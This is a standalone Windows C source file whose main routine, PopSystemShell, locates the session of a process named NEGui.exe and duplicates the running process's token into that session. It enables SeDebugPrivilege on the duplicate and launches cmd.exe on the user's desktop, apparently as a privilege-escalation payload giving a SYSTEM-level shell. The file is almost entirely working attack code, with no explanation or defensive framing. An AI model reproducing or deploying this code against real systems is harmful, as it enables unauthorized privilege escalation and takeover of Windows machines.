#include <windows.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <tlhelp32.h>
#include <stdbool.h>

#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")

DWORD FindProcessId(const wchar_t* processName) {
    PROCESSENTRY32W processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (Process32FirstW(processesSnapshot, &processInfo)) {
        if (wcscmp(processName, processInfo.szExeFile) == 0) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    while (Process32NextW(processesSnapshot, &processInfo)) {
        if (wcscmp(processName, processInfo.szExeFile) == 0) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

bool PopSystemShell() {
    BOOL bSuccess = FALSE;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE oldToken = NULL;
    HANDLE newToken = NULL;
    HANDLE privToken = NULL;
    LPVOID pEnv = NULL;
    DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.lpDesktop = L"Winsta0\\default";
    ZeroMemory(&pi, sizeof(pi));

    DWORD sessionId;
    DWORD dwPid = FindProcessId(L"NEGui.exe");
    ProcessIdToSessionId(dwPid, &sessionId);

    if (sessionId == 0xFFFFFFFF || sessionId == 0) {
        goto CLEANUP_EXIT;
    }

    if (WTSQueryUserToken(sessionId, &oldToken)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_SESSIONID
            | TOKEN_READ | TOKEN_WRITE, &privToken)) {
            goto CLEANUP_EXIT;
        }

        // Enable SeDebugPrivilege
        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            goto CLEANUP_EXIT;
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // Duplicate our token to &newToken
        if (!DuplicateTokenEx(privToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &newToken)) {
            goto CLEANUP_EXIT;
        }

        if (!SetTokenInformation(newToken, TokenSessionId, (void*)&sessionId, sizeof(DWORD))) {
            goto CLEANUP_EXIT;
        }

        if (!AdjustTokenPrivileges(newToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, NULL)) {
            goto CLEANUP_EXIT;
        }

        if (CreateEnvironmentBlock(&pEnv, newToken, TRUE)) {
            dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
        }

        // Create process for user with desktop
        if (!CreateProcessAsUserW(newToken, L"C:\\Windows\\System32\\cmd.exe",
            NULL, NULL, NULL, FALSE, dwCreationFlags, pEnv, L"C:\\Windows\\System32\\", &si, &pi)) {
            goto CLEANUP_EXIT;
        }

        bSuccess = TRUE;
    }

CLEANUP_EXIT:
    if (oldToken != NULL) CloseHandle(oldToken);
    if (newToken != NULL) CloseHandle(newToken);
    if (privToken != NULL) CloseHandle(privToken);
    if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
    if (pi.hThread != NULL) CloseHandle(pi.hThread);
    if (pEnv != NULL) DestroyEnvironmentBlock(pEnv);
    return bSuccess;
}

int main() {
    if (PopSystemShell()) {
        return 0;
    } else {
        return 1;
    }
}